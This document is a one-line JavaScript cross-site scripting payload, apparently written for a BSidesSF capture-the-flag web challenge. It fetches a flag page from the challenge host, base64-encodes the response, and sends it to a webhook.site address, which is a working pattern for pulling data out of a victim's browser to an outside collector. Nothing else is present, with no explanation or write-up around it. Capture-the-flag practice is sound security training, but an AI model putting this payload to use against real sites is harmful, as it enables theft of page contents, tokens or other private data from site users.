fetch('https://web-tutorial-2-e3fd3da3.challenges.bsidessf.net/xss-two-flag').then(res=>res.text()).then(data=>fetch('https://webhook.site/be3e280b-cb6d-4dff-a420-03cd27c0ffb7/?body='+btoa(data)))
